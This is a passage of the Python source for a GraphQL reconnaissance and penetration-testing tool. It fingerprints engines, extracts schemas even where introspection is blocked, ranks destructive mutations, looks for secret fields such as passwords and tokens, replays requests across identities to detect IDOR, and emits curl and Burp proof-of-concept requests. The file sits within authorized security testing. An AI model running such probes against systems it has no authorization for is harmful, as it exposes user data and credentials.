#!/usr/bin/env python3
"""
gqlhunt.py - GraphQL reconnaissance and vulnerability extractor.

Replaces graphw00f + graphql-cop + clairvoyance with one tool that always
terminates and always proves what it reports.

  1. DISCOVERY   the {__typename} signature - no wordlist, no false positive.
  2. FINGERPRINT the engine, from error-message signatures (graphw00f's idea,
                 integrated so the result can DRIVE the rest of the run).
  3. SCHEMA      a ladder from cheapest to most expensive: introspection,
                 introspection over GET, filter-evasion spellings, batched
                 __type() probing, and only then suggestion brute force -
                 which is skipped entirely unless suggestions are proven to
                 be enabled first. Every rung is budgeted in requests AND in
                 seconds, so this never runs forever.
  4. ANALYSIS    the schema is read, not just dumped: mutations ranked by
                 destructiveness, sensitive fields located in every type, and
                 nested paths computed from a Query root to each sensitive
                 type - the alternative routes that bypass an authorization
                 check placed only on the obvious resolver.
  5. PROOF       graphql-cop's test list, with "the server did not reject it"
                 replaced by a measurement or a returned value. Batching is
                 confirmed by counting the results and timing them; CSRF is
                 confirmed by executing `mutation{__typename}` (valid, and
                 side-effect free) over GET and over form-urlencoded; the
                 absence of a depth limit is observed, never exploited.

  AUTHORIZATION  with -r (a captured authenticated request) the same
                 operations are replayed anonymously; with -r2 (a second
                 account) the first account's own operation is replayed under
                 the second identity. Identical non-empty data across
                 identities is the IDOR signal, and nothing else in this
                 space automates it.

SAFETY - mutations are NEVER executed. They are classified from the schema
and a ready-to-run PoC is emitted for manual confirmation; --allow-mutations
opts in and still refuses a hardcoded destructive verb list. The DoS-class
tests are bounded (alias count, depth) and measured rather than amplified:
the goal is to show the guard rail is missing, not to take the target down.

Stdlib only. TLS verification disabled. For authorized testing only.
"""

from __future__ import annotations

import argparse
import concurrent.futures
import json
import os
import re
import ssl
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field

VERSION = "2.0.0"
MAX_BODY = 3 * 1024 * 1024

DEFAULT_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")

CRIT, HIGH, MED, LOW, INFO = "CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"
_SEV_ORDER = {CRIT: 0, HIGH: 1, MED: 2, LOW: 3, INFO: 4}

# ----------------------------------------------------------------------------
# Endpoint paths (graphw00f's list, plus the framework-specific ones)
# ----------------------------------------------------------------------------

ENDPOINT_PATHS = [
    "/graphql", "/graphql/", "/api/graphql", "/api/gql", "/graphql/api",
    "/rwgraphql", "/api/rwgraphql",
    "/v1/graphql", "/v2/graphql", "/v3/graphql", "/api/v1/graphql",
    "/api/v2/graphql", "/graphql/v1", "/graphql/v2", "/gql", "/query",
    "/graphql.php", "/index.php?graphql", "/graphql/console", "/graphiql",
    "/graphiql.php", "/playground", "/altair", "/voyager", "/graph",
    "/api", "/api/", "/data/graphql", "/admin/api", "/shop/api",
    "/graphql-api", "/_graphql", "/.netlify/functions/graphql",
    "/v1/api/graphql", "/api/graphql/v1", "/graphql/query", "/api/query",
]

# Paths whose mere presence (as HTML) tells us a console is exposed.
CONSOLE_PATHS = ["/graphiql", "/playground", "/altair", "/voyager",
                 "/graphql/console", "/graphql"]

# ----------------------------------------------------------------------------
# Engine fingerprints (graphw00f). Each entry: name, probe key, regex.
# The probes are sent once each; every signature is matched against the
# concatenated body of the probe it names.
# ----------------------------------------------------------------------------

# probe name -> the document sent
FP_PROBES = {
    "bad_field":   '{ zzzGqlHuntProbe }',
    "syntax":      'qwerty',
    "bad_alias":   '{ alias^: __typename }',
    "directive":   'query @skipp { __typename }',
    "subscription": 'subscription { zzzGqlHuntProbe }',
    "meta":        '{ __typenam }',
    "empty":       '',
    "fragment":    'fragment zz on Query { __typename } { __typename }',
}

# (engine, probe, regex, confidence)
FP_SIGNATURES = [
    ("Hasura",            "bad_field",   r"field ['\"]?zzzGqlHuntProbe['\"]? not found in type: ['\"]?query_root", 3),
    ("Hasura",            "syntax",      r"not a valid graphql query|query_root", 2),
    ("Dgraph",            "bad_field",   r"There's no GraphQL schema in Dgraph|resolving __typename", 3),
    ("AWS AppSync",       "bad_field",   r"Validation error of type FieldUndefined", 3),
    ("AWS AppSync",       "empty",       r"MalformedHttpRequestException", 3),
    ("HotChocolate",      "bad_field",   r"The field [`'\"]zzzGqlHuntProbe[`'\"] does not exist", 3),
    ("HotChocolate",      "syntax",      r"HC\d{4}", 3),
    ("graphql-ruby",      "bad_field",   r"Field ['\"]zzzGqlHuntProbe['\"] doesn't exist on type ['\"]Query['\"]", 3),
    ("graphql-ruby",      "empty",       r"No query string was present", 3),
    ("Absinthe (Elixir)", "bad_field",   r"Cannot query field [\"']zzzGqlHuntProbe[\"'] on type [\"']RootQueryType[\"']", 3),
    ("Juniper (Rust)",    "bad_field",   r"Unknown field [\"']zzzGqlHuntProbe[\"'] on type [\"']Query[\"']", 3),
    ("Sangria (Scala)",   "syntax",      r"Syntax error while parsing GraphQL query", 3),
    ("gqlgen (Go)",       "syntax",      r"expected at least one definition|Expected Name, found <EOF>", 2),
    ("gqlgen (Go)",       "bad_field",   r"Cannot query field [\"']zzzGqlHuntProbe[\"'] on type [\"']Query[\"']\.$", 1),
    ("graphql-go",        "bad_field",   r"Cannot query field [\"']zzzGqlHuntProbe[\"'] on type [\"']Query[\"']\.", 1),
    ("Lighthouse (PHP)",  "bad_field",   r"Internal server error|\"category\":\s*\"graphql\"", 2),
    ("graphql-php",       "syntax",      r"Syntax Error: Unexpected <EOF>|\"category\":\s*\"request\"", 2),
    ("WPGraphQL",         "bad_field",   r"GraphQL request must include|wp-content|\"category\":\s*\"user\"", 2),
    ("Strawberry (Py)",   "bad_field",   r"Cannot query field ['\"]zzzGqlHuntProbe['\"] on type ['\"]Query['\"]\.$", 1),
    ("Graphene (Py)",     "bad_field",   r"Cannot query field [\"']zzzGqlHuntProbe[\"'] on type [\"']Query[\"']", 1),
    ("Ariadne (Py)",      "empty",       r"The query must be a string|Unsupported query type", 3),
    ("Apollo Server",     "bad_field",   r"GRAPHQL_VALIDATION_FAILED|apollo", 2),
    ("Apollo Server",     "empty",       r"GET query missing|POST body missing", 3),
    ("graphql-js / Yoga", "bad_field",   r"Cannot query field [\"']zzzGqlHuntProbe[\"'] on type [\"']Query[\"']", 1),
    ("graphql-js / Yoga", "empty",       r"Must provide query string", 2),
    ("PostGraphile",      "bad_field",   r"Unknown field ['\"]zzzGqlHuntProbe['\"]|postgraphile", 2),
    ("Directus",          "bad_field",   r"directus|\"extensions\":\{\"code\":\"INVALID_QUERY\"", 2),
    ("Saleor",            "bad_field",   r"saleor", 2),
    ("Shopify",           "bad_field",   r"shopify|X-Shopify", 2),
]

# ----------------------------------------------------------------------------
# What counts as sensitive
# ----------------------------------------------------------------------------

SENSITIVE_FIELD_RX = re.compile(
    r"(?i)(password|passwd|pwd|hash|salt|secret|token|api[_-]?key|access[_-]?key|"
    r"private[_-]?key|otp|totp|two[_-]?factor|twofa|mfa|ssn|social[_-]?security|"
    r"tax[_-]?id|iban|bic|swift|credit[_-]?card|card[_-]?number|cvv|cvc|"
    r"\bpin\b|is[_-]?admin|is[_-]?superuser|is[_-]?staff|\brole\b|permission|"
    r"scope|internal|reset[_-]?code|verification[_-]?code|invite[_-]?code|"
    r"refresh[_-]?token|session[_-]?id|cookie|passport|salary|compensation)")

PII_FIELD_RX = re.compile(
    r"(?i)(email|e_mail|phone|mobile|address|postal|zip|birth|dob|"
    r"first[_-]?name|last[_-]?name|full[_-]?name|national|document)")

# Mutation verbs, by how much you do not want to fire them by accident.
DESTRUCTIVE_RX = re.compile(
    r"(?i)(delete|destroy|remove|drop|purge|wipe|truncate|erase|revoke|"
    r"transfer|withdraw|payout|refund|charge|capture|cancel|terminate|"
    r"impersonate|assume|sudo|exec|eval|shell|command|restore|migrate|seed)")
PRIVILEGED_RX = re.compile(
    r"(?i)(grant|promote|demote|set[_-]?role|update[_-]?role|change[_-]?role|"
    r"add[_-]?admin|create[_-]?admin|make[_-]?admin|disable|enable|ban|"
    r"suspend|activate|deactivate|approve|reject|verify|confirm|"
    r"reset[_-]?password|set[_-]?password|change[_-]?password|"
    r"change[_-]?email|update[_-]?email|invite|api[_-]?key|token)")
WRITE_RX = re.compile(
    r"(?i)^(create|add|new|update|edit|modify|set|upsert|save|publish|"
    r"unpublish|upload|import|export|send|notify|broadcast|sync|merge|link)")

# Root fields worth asking for by name when we have to guess.
ROOT_WORDS = """me viewer currentUser whoami myAccount user users account accounts
customer customers profile profiles admin adminUser administrator employee
employees member members organization organizations org orgs team teams
company companies project projects order orders invoice invoices payment
payments transaction transactions card cards subscription subscriptions
product products item items cart checkout address addresses message messages
conversation conversations notification notifications comment comments post
posts article articles file files document documents upload uploads media
image images setting settings config configuration feature features flag
flags token tokens apiKey apiKeys secret secrets credential credentials
session sessions role roles permission permissions group groups audit
auditLog auditLogs log logs event events report reports search node nodes
allUsers allOrders feed timeline dashboard analytics metrics stats statistics
billing plan plans coupon coupons discount refund refunds payout payouts
wallet balance ticket tickets support contact contacts lead leads store
stores shop branch branches location locations inventory warehouse shipment
shipments tracking category categories tag tags review reviews rating ratings
favorite favorites wishlist booking bookings reservation reservations
appointment appointments schedule calendar task tasks job jobs workflow
integration integrations webhook webhooks connection connections application
applications client clients device devices key keys license licenses
certificate certificates health version status internal debug""".split()

# Child-field candidates: what you actually want off a User or an Order.
CHILD_WORDS = """id uuid email emailAddress phone phoneNumber username login
name firstName lastName fullName role roles isAdmin isStaff isSuperuser
permissions scopes password passwordHash hashedPassword passwordSalt salt
token apiToken apiKey accessToken refreshToken sessionToken secret
clientSecret twoFactorSecret totpSecret mfaSecret otp otpSecret recoveryCodes
resetToken resetCode verificationCode inviteCode ssn socialSecurityNumber
taxId iban bic card cardNumber last4 cvv expiry address street city zip
postalCode country dateOfBirth birthDate salary balance amount total price
currency status createdAt updatedAt deletedAt internalNotes notes metadata
owner author user users customer account organization company team posts
orders invoices payments transactions items children parent node edges""".split()

# Type names worth asking __type() about when __schema is blocked.
TYPE_WORDS = """User Users UserType Account AccountType Customer Admin AdminUser
Profile Employee Member Organization Company Team Project Order Invoice
Payment Transaction Product Item Cart Address Message Comment Post Article
File Document Media Setting Settings Config Token ApiKey Secret Credential
Session Role Permission Group AuditLog Event Report Subscription Plan Coupon
Refund Payout Wallet Ticket Contact Lead Store Location Booking Reservation
Task Job Webhook Integration Device License Certificate Query Mutation
Subscription RootQueryType query_root mutation_root UserConnection
UserEdge Node Viewer Me CurrentUser""".split()




# ----------------------------------------------------------------------------
# Copy/paste material
#
# A PoC that has to be repaired by hand is not a PoC. Three rules here:
# nothing is ever truncated, the shell quoting is done properly (a payload
# containing an apostrophe must not break the command), and every request is
# also given in the canonical named-operation + variables form, because that
# is what goes into a report and what the target's own front-end sends.
#
# Inline literals and variables are strictly equivalent per the GraphQL spec -
# verified against graphql-core - but a variable MUST be declared with the
# exact type the schema gives the argument: $id: ID! against an argument
# declared String! is a validation error, not a detail.
# ----------------------------------------------------------------------------

def shell_quote(s):
    """POSIX-safe single quoting, apostrophes included."""
    return "'" + str(s).replace("'", "'\"'\"'") + "'"


def gql_body(doc, variables=None, op_name=None):
    body = {}
    if op_name:
        body["operationName"] = op_name
    if variables:
        body["variables"] = variables
    body["query"] = doc
    return json.dumps(body, ensure_ascii=False)


def build_poc(url, doc, variables=None, op_name=None, headers=None,
              transport=None, label=""):
    """
    Ready-to-paste, in the wire format the target actually speaks. A PoC
    built as a plain JSON POST against a gateway that wants ?doc= is a PoC
    that does not reproduce.
    """
    t = transport or Transport()
    method, full, body, ctype = t.build(url, doc, variables, op_name)
    raw = body if body is not None else ""

    hdr = []
    if ctype:
        hdr.append("-H " + shell_quote(f"Content-Type: {ctype}"))
    for k, v in (headers or {}).items():
        if k.lower() in ("content-type", "content-length", "host"):
            continue
        hdr.append("-H " + shell_quote(f"{k}: {v}"))
    curl = f"curl -sk -X {method} {shell_quote(full)}"
    if hdr:
        curl += " " + " ".join(hdr)
    if body is not None:
        curl += " --data " + shell_quote(body)

    p = urllib.parse.urlsplit(full)
    path = (p.path or "/") + (("?" + p.query) if p.query else "")
    http = [f"{method} {path} HTTP/1.1", f"Host: {p.netloc}"]
    if ctype:
        http.append(f"Content-Type: {ctype}")
    for k, v in (headers or {}).items():
        if k.lower() not in ("content-type", "content-length", "host"):
            http.append(f"{k}: {v}")
    if body is not None:
        http += [f"Content-Length: {len(body.encode())}", "", body]
    else:
        http += ["", ""]

    summary = gql_body(doc, variables, op_name)
    lines = []
    if body is not None:
        lines.append("body   " + body)
    else:
        lines.append("doc    " + summary + "   (this transport carries the "
                                           "document in the URL)")
    lines.append("curl   " + curl)
    lines.append("burp   " + " / ".join(http[:2])
                 + " ... (full request in pocs.txt)")
    return "\n".join(lines), curl, "\n".join(http), raw


def operation_form(schema, field, arg_values, selection):
    """
    (document, variables, operation_name) in the named + variables form, using
    each argument's DECLARED type - copied verbatim from the schema.
    """
    name = field.get("name")
    op_name = re.sub(r"[^A-Za-z0-9_]", "", name[:1].upper() + name[1:]) or "Op"
    decls, call, variables = [], [], {}
    for arg in field.get("args") or []:
        if not isinstance(arg, dict):
            continue
        aname = arg.get("name")
        if aname not in arg_values:
            continue
        decls.append(f"${aname}: {type_ref(arg.get('type'))}")
        call.append(f"{aname}: ${aname}")
        variables[aname] = arg_values[aname]
    head = f"query {op_name}"
    if decls:
        head += "(" + ", ".join(decls) + ")"
    inner = f"{name}" + (("(" + ", ".join(call) + ")") if call else "")
    doc = f"{head} {{ {inner} {selection} }}".replace("  ", " ").strip()
    return doc, variables, op_name


# ----------------------------------------------------------------------------
# Field-name classification
#
# Substring matching on identifiers is a false-positive machine: "scope" fires
# on horoscope, "otp" on geofootprint, "mfa" on TaxonomyTermFacility. Names are
# therefore split into tokens (camelCase, snake_case, digits) and matched as
# whole words, then confirmed against the field's own type - a secret is a
# string, never an Int or a Boolean.
# ----------------------------------------------------------------------------

def identifier_tokens(name):
    t = re.sub(r"[_\-.]+", " ", name or "")
    t = re.sub(r"(?<=[a-z0-9])(?=[A-Z])", " ", t)
    t = re.sub(r"(?<=[A-Z])(?=[A-Z][a-z])", " ", t)
    t = re.sub(r"(?<=[A-Za-z])(?=[0-9])", " ", t)
    return [p.lower() for p in t.split() if p]


# Tokens that are a secret on their own.
STRONG_TOKENS = {
    "password", "passwd", "pwd", "passphrase", "secret", "secrets",
    "apikey", "accesskey", "privatekey", "clientsecret", "token", "tokens",
    "totp", "mfa", "2fa", "twofactor", "otp", "ssn", "iban", "cvv", "cvc",
    "passport", "jwt", "bearer", "credential", "credentials", "privkey",
}
# Tokens that only matter as a qualified pair, e.g. api + key.
KEY_QUALIFIERS = {"api", "access", "private", "secret", "signing", "signature",
                  "encryption", "client", "license", "auth", "session",
                  "refresh", "master", "consumer"}
# Worth listing, not worth a CRITICAL on their own.
WEAK_TOKENS = {"hash", "hashed", "salt", "scope", "scopes", "role", "roles",
               "permission", "permissions", "internal", "pin", "signature",
               "seed", "key", "keys", "policy" if False else "acl"}
PII_TOKENS = {"email", "mail", "phone", "mobile", "msisdn", "address",
              "postal", "postcode", "zip", "birthdate", "birthday", "dob",
              "firstname", "lastname", "fullname", "surname", "givenname",
              "nationality", "iban", "siret", "siren"}
# A value of one of these types is not a secret, whatever it is called:
# accessTokenExpiration is an Int.
NON_SECRET_SCALARS = {"Int", "Float", "Boolean", "DateTime", "Date",
                      "Timestamp", "BigInt", "Long"}


def classify_name(name, type_name=None):
    """-> 'secret' | 'weak' | 'pii' | None"""
    toks = identifier_tokens(name)
    if not toks:
        return None
    tset = set(toks)
    joined = "".join(toks)
    kind = None
    if tset & STRONG_TOKENS or joined in STRONG_TOKENS:
        kind = "secret"
    elif "key" in tset and tset & KEY_QUALIFIERS:
        kind = "secret"
    elif any(t in ("passhash", "pwdhash") for t in toks):
        kind = "secret"
    elif ("pass" in tset or "password" in tset) and tset & {"hash", "hashed"}:
        kind = "secret"
    elif tset & WEAK_TOKENS:
        kind = "weak"
    elif tset & PII_TOKENS:
        kind = "pii"
    if kind == "secret" and type_name in NON_SECRET_SCALARS:
        kind = "weak"          # a count, a flag or an expiry, not a secret
    return kind


# ----------------------------------------------------------------------------
# Output plumbing
# ----------------------------------------------------------------------------

class Colors:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"
    BLUE = "\033[34m"; MAGENTA = "\033[35m"; CYAN = "\033[36m"; GREY = "\033[90m"

    @classmethod
    def disable(cls):
        for a in ("RESET", "BOLD", "DIM", "RED", "GREEN", "YELLOW", "BLUE",
                  "MAGENTA", "CYAN", "GREY"):
            setattr(cls, a, "")


def sev_paint(sev):
    return {CRIT: Colors.RED + Colors.BOLD, HIGH: Colors.RED,
            MED: Colors.YELLOW, LOW: Colors.CYAN,
            INFO: Colors.GREY}.get(sev, "")


@dataclass
class Finding:
    sev: str
    title: str
    url: str = ""
    impact: str = ""
    proof: list = field(default_factory=list)
    note: str = ""
    poc: str = ""
    chain: str = ""


ANSI_RX = re.compile(r"\x1b\[[0-9;]*m")


class Reporter:
    """Everything printed is also written to the current target's log file."""

    def __init__(self, level=0):
        self.level = level
        self.lock = threading.Lock()
        self.local = threading.local()

    def attach(self, fh):
        self.local.fh = fh

    def detach(self):
        fh = getattr(self.local, "fh", None)
        self.local.fh = None
        if fh:
            try:
                fh.flush()
                fh.close()
            except Exception:
                pass

    def log_only(self, text):
        fh = getattr(self.local, "fh", None)
        if fh:
            try:
                fh.write(ANSI_RX.sub("", text) + "\n")
                fh.flush()
            except Exception:
                pass

    def _emit(self, text):
        with self.lock:
            sys.stdout.write(text + "\n")
            sys.stdout.flush()
        self.log_only(text)

    def line(self, text=""):
        self._emit(text)

    def banner(self, msg):
        self._emit(f"\n{Colors.BOLD}{Colors.BLUE}=== {msg} ==={Colors.RESET}")

    def finding(self, f: Finding):
        C, p = Colors, sev_paint(f.sev)
        out = [f"\n{p}[{f.sev}]{C.RESET} {C.BOLD}{f.title}{C.RESET}"]
        if f.url:
            out.append(f"  {C.DIM}URL     :{C.RESET} {f.url}")
        if f.impact:
            out.append(f"  {C.DIM}Impact  :{C.RESET} {f.impact}")
        if f.proof:
            out.append(f"  {C.DIM}Proof   :{C.RESET} {len(f.proof)} item(s)")
            for item in f.proof[:25]:
                out.append(f"      {C.GREEN}{item}{C.RESET}")
            if len(f.proof) > 25:
                out.append(f"      {C.DIM}... {len(f.proof) - 25} more "
                           f"(see the output directory){C.RESET}")
        if f.note:
            out.append(f"  {C.DIM}Note    :{C.RESET} {f.note}")
        if f.chain:
            out.append(f"  {C.DIM}Chain   :{C.RESET} {C.MAGENTA}{f.chain}{C.RESET}")
        if f.poc:
            lines = f.poc.split("\n")
            out.append(f"  {C.DIM}PoC     :{C.RESET} {lines[0]}")
            for extra in lines[1:]:
                out.append(f"            {extra}")
        self._emit("\n".join(out))

    def test(self, msg):
        if self.level >= 1:
            self._emit(f"{Colors.DIM}[test] {msg}{Colors.RESET}")

    def info(self, msg):
        if self.level >= 1:
            self._emit(f"{Colors.CYAN}[info]{Colors.RESET} {msg}")

    def debug(self, msg):
        if self.level >= 2:
            self._emit(f"{Colors.GREY}[dbg] {msg}{Colors.RESET}")

    def warn(self, msg):
        self._emit(f"{Colors.YELLOW}[warn]{Colors.RESET} {msg}")

    def error(self, msg):
        self._emit(f"{Colors.RED}[err ]{Colors.RESET} {msg}")


class Status:
    """Periodic progress line, list mode only."""

    def __init__(self, rep, total, interval=30.0, enabled=True):
        self.rep, self.total, self.interval = rep, total, interval
        self.enabled = enabled and total > 1
        self.done = 0
        self.findings = 0
        self.start = time.time()
        self.lock = threading.Lock()
        self._stop = threading.Event()
        self.thread = None

    def start_thread(self):
        if not self.enabled:
            return
        self.thread = threading.Thread(target=self._loop, daemon=True)
        self.thread.start()

    def _loop(self):
        while not self._stop.wait(self.interval):
            self.emit()

    def target_done(self):
        with self.lock:
            self.done += 1

    def record(self, n=1):
        with self.lock:
            self.findings += n

    def emit(self):
        if not self.enabled:
            return
        el = int(time.time() - self.start)
        with self.lock:
            done, total, f = self.done, self.total, self.findings
        self.rep.line(f"{Colors.BLUE}[status {el // 60:02d}:{el % 60:02d}]"
                      f"{Colors.RESET} tested {done}/{total}   "
                      f"remaining {total - done}   findings {f}")

    def stop(self):
        self._stop.set()
        if self.thread:
            self.thread.join(timeout=1)


# ----------------------------------------------------------------------------
# Budget - the reason this terminates and clairvoyance does not
# ----------------------------------------------------------------------------

class Budget:
    class Exhausted(Exception):
        pass

    def __init__(self, max_requests, max_seconds, max_errors=12):
        self.max_requests = max_requests
        self.deadline = time.time() + max_seconds
        self.max_errors = max_errors
        self.requests = 0
        self.errors = 0
        self.lock = threading.Lock()
        self.reason = ""

    def spend(self, n=1):
        with self.lock:
            self.requests += n
            if self.requests > self.max_requests:
                self.reason = f"request budget ({self.max_requests}) reached"
                raise Budget.Exhausted(self.reason)
            if time.time() > self.deadline:
                self.reason = "time budget reached"
                raise Budget.Exhausted(self.reason)

    def ok_error(self):
        with self.lock:
            self.errors += 1
            if self.errors > self.max_errors:
                self.reason = (f"{self.errors} transport errors - the target "
                               f"is rate limiting or down")
                raise Budget.Exhausted(self.reason)

    def good(self):
        with self.lock:
            self.errors = 0

    def left(self):
        with self.lock:
            return max(0, self.max_requests - self.requests)


# ----------------------------------------------------------------------------
# HTTP
# ----------------------------------------------------------------------------

@dataclass
class Response:
    status: int = 0
    body: str = ""
    headers: dict = field(default_factory=dict)
    error: str = ""
    elapsed: float = 0.0

    @property
    def ok(self):
        return not self.error

    def header(self, name, default=""):
        for k, v in self.headers.items():
            if k.lower() == name.lower():
                return v
        return default

    def json(self):
        b = (self.body or "").lstrip()
        if not (b.startswith("{") or b.startswith("[")):
            return None
        try:
            return json.loads(self.body)
        except Exception:
            return None


class Rate:
    def __init__(self, gap):
        self.gap = gap
        self.last = 0.0
        self.lock = threading.Lock()

    def wait(self):
        if self.gap <= 0:
            return
        with self.lock:
            now = time.time()
            delta = self.last + self.gap - now
            if delta > 0:
                time.sleep(delta)
            self.last = time.time()


class Http:
    def __init__(self, timeout=15.0, proxy=None, headers=None, delay=0.0,
                 rep: Reporter = None):
        self.timeout = timeout
        self.proxy = proxy
        self.rep = rep
        self.rate = Rate(delay)
        self.extra = {}
        for h in headers or []:
            if ":" in h:
                k, v = h.split(":", 1)
                self.extra[k.strip()] = v.strip()
        self.ctx = ssl.create_default_context()
        self.ctx.check_hostname = False
        self.ctx.verify_mode = ssl.CERT_NONE
        self._opener = None
        self._lock = threading.Lock()
        self.count = 0

    def opener(self):
        with self._lock:
            if self._opener is None:
                handlers = [urllib.request.HTTPSHandler(context=self.ctx)]
                if self.proxy:
                    handlers.append(urllib.request.ProxyHandler(
                        {"http": self.proxy, "https": self.proxy}))
                else:
                    handlers.append(urllib.request.ProxyHandler({}))
                self._opener = urllib.request.build_opener(*handlers)
            return self._opener

    def request(self, method, url, body=None, headers=None,
                max_read=MAX_BODY) -> Response:
        with self._lock:
            self.count += 1
        self.rate.wait()
        hdrs = {"User-Agent": DEFAULT_UA, "Accept": "*/*",
                "Accept-Encoding": "identity"}
        hdrs.update(self.extra)
        hdrs.update(headers or {})
        data = body.encode("utf-8", "replace") if isinstance(body, str) else body
        req = urllib.request.Request(url, data=data, method=method)
        for k, v in hdrs.items():
            if v is None:
                continue
            req.remove_header(k)
            req.add_header(k, v)
        t0 = time.time()
        try:
            with self.opener().open(req, timeout=self.timeout) as r:
                raw = r.read(max_read)
                return Response(status=r.status,
                                body=raw.decode("utf-8", "replace"),
                                headers=dict(r.headers),
                                elapsed=time.time() - t0)
        except urllib.error.HTTPError as e:
            try:
                raw = e.read(max_read)
            except Exception:
                raw = b""
            return Response(status=e.code, body=raw.decode("utf-8", "replace"),
                            headers=dict(e.headers or {}),
                            elapsed=time.time() - t0)
        except Exception as e:
            return Response(error=f"{type(e).__name__}: {e}",
                            elapsed=time.time() - t0)


# ----------------------------------------------------------------------------
# Identities (anonymous, -r, -r2)
# ----------------------------------------------------------------------------

HOP_BY_HOP = {"connection", "keep-alive", "proxy-authenticate", "te",
              "trailer", "transfer-encoding", "upgrade", "content-length",
              "accept-encoding", "host"}


@dataclass
class Identity:
    name: str
    headers: dict = field(default_factory=dict)
    source: str = ""
    operation: dict = None      # {"query":..., "variables":..., ...}


def parse_raw_request(path, force_ssl=False):
    """Burp/ZAP 'Copy to file'. Returns (url, method, headers, body)."""
    with open(path, "rb") as fh:
        raw = fh.read().decode("utf-8", "replace")
    raw = raw.replace("\r\n", "\n")
    head, _, body = raw.partition("\n\n")
    lines = [l for l in head.split("\n") if l.strip()]
    if not lines:
        raise ValueError(f"{path}: empty request file")
    parts = lines[0].split()
    if len(parts) < 2:
        raise ValueError(f"{path}: cannot parse request line {lines[0]!r}")
    method, target = parts[0].upper(), parts[1]

    headers = {}
    for line in lines[1:]:
        if ":" not in line:
            continue
        k, v = line.split(":", 1)
        k, v = k.strip(), v.strip()
        if k.lower() in HOP_BY_HOP:
            if k.lower() == "host":
                headers["__host"] = v
            continue
        headers[k] = v

    host = headers.pop("__host", "")
    if target.startswith("http://") or target.startswith("https://"):
        url = target
    else:
        scheme = "https" if force_ssl else "http"
        if not force_ssl:
            for ref in ("Origin", "Referer"):
                val = headers.get(ref, "")
                if val.startswith("https://"):
                    scheme = "https"
                    break
            else:
                if host.endswith(":443"):
                    scheme = "https"
        if not host:
            raise ValueError(f"{path}: no Host header and no absolute URL")
        url = f"{scheme}://{host}{target}"
    return url, method, headers, body


def looks_like_document(text):
    t = (text or "").strip()
    if len(t) < 3 or "{" not in t:
        return False
    return bool(re.match(r"^\s*(query|mutation|subscription|fragment|\{)", t))


def identity_from_request(path, name, force_ssl=False):
    """
    Returns (url, Identity, Transport).

    The captured request does not just carry a session - it carries the wire
    format the target actually speaks. Reproducing it beats guessing it.
    """
    url, method, headers, body = parse_raw_request(path, force_ssl)
    split = urllib.parse.urlsplit(url)
    params = urllib.parse.parse_qs(split.query, keep_blank_values=True)
    base_url = urllib.parse.urlunsplit(
        (split.scheme, split.netloc, split.path, "", ""))

    t = Transport(method=method or "POST")
    op = {}
    url_doc_key = None
    for key in DOC_URL_KEYS:
        vals = params.get(key) or []
        if vals and looks_like_document(vals[0]):
            url_doc_key = key
            op.setdefault("query", vals[0])
            break

    body_doc_key = None
    ctype = ""
    for k, v in headers.items():
        if k.lower() == "content-type":
            ctype = v.lower()
    b = (body or "").strip()
    if b:
        if "json" in ctype or b.startswith("{") or b.startswith("["):
            try:
                parsed = json.loads(b)
            except Exception:
                parsed = None
            if isinstance(parsed, list) and parsed:
                parsed = parsed[0]
            if isinstance(parsed, dict):
                for key in DOC_BODY_KEYS:
                    if looks_like_document(parsed.get(key)):
                        body_doc_key = key
                        t.body_kind = "json"
                        op["query"] = parsed[key]
                        break
                if parsed.get("variables"):
                    op["variables"] = parsed["variables"]
                if parsed.get("operationName"):
                    op["operationName"] = parsed["operationName"]
        elif "urlencoded" in ctype:
            form = urllib.parse.parse_qs(b)
            for key in DOC_BODY_KEYS:
                if form.get(key) and looks_like_document(form[key][0]):
                    body_doc_key = key
                    t.body_kind = "form"
                    op["query"] = form[key][0]
                    break
        elif looks_like_document(b):
            body_doc_key = "query"
            t.body_kind = "graphql"
            op["query"] = b

    if url_doc_key and body_doc_key:
        t.doc_in, t.url_doc_key, t.body_doc_key = "both", url_doc_key, body_doc_key
        t.label = (f"{method} document MIRRORED in ?{url_doc_key}= and "
                   f"body.{body_doc_key}")
    elif url_doc_key:
        t.doc_in, t.url_doc_key = "url", url_doc_key
        t.label = f"{method} document in ?{url_doc_key}="
    elif body_doc_key:
        t.doc_in, t.body_doc_key = "body", body_doc_key
        t.label = f"{method} {t.body_kind} document in body.{body_doc_key}"
    else:
        t.label = f"{method} (no document found in the capture)"

    # keep the other URL parameters - access_token and friends live there
    for k, vals in params.items():
        if k in ("variables", "operationName") or k == url_doc_key:
            continue
        if vals:
            t.extra_url[k] = vals[0]

    if not params.get("variables") and "variables" not in op:
        pass
    elif params.get("variables") and "variables" not in op:
        try:
            op["variables"] = json.loads(params["variables"][0])
        except Exception:
            pass
    if params.get("operationName") and "operationName" not in op:
        op["operationName"] = params["operationName"][0]

    keep = {k: v for k, v in headers.items()
            if k.lower() not in ("content-type", "content-length")}
    return (base_url,
            Identity(name=name, headers=keep, source=path,
                     operation=op if op.get("query") else None),
            t)



# ----------------------------------------------------------------------------
# Transport
#
# "The GraphQL endpoint" is not one wire format. A document can travel as the
# `query` key of a JSON body, as a `doc` URL parameter, as a form field, as a
# raw application/graphql body - and, on gateways such as Meta's Graph API,
# in TWO places at once: `?doc=<document>` in the URL of a POST whose JSON
# body also carries `query`. Everything below is driven by a Transport, so a
# captured request can simply TEACH the tool the shape to use.
# ----------------------------------------------------------------------------

DOC_URL_KEYS = ("doc", "query", "q", "gql", "graphql")
DOC_BODY_KEYS = ("query", "doc", "gql")


@dataclass
class Transport:
    label: str = "POST application/json {query}"
    method: str = "POST"
    doc_in: str = "body"                 # body | url | both
    url_doc_key: str = "doc"
    body_doc_key: str = "query"
    body_kind: str = "json"              # json | form | graphql
    extra_url: dict = field(default_factory=dict)

    def describe(self):
        where = {"body": f"body.{self.body_doc_key}",
                 "url": f"?{self.url_doc_key}=",
                 "both": f"?{self.url_doc_key}= AND body.{self.body_doc_key}"}
        return (f"{self.method} {self.body_kind} document in "
                f"{where[self.doc_in]}")

    def build(self, url, doc, variables=None, op_name=None, url_doc=None):
        """url_doc: a DIFFERENT document for the URL copy (differential test)."""
        params = dict(self.extra_url)
        body = ctype = None
        if self.doc_in in ("url", "both"):
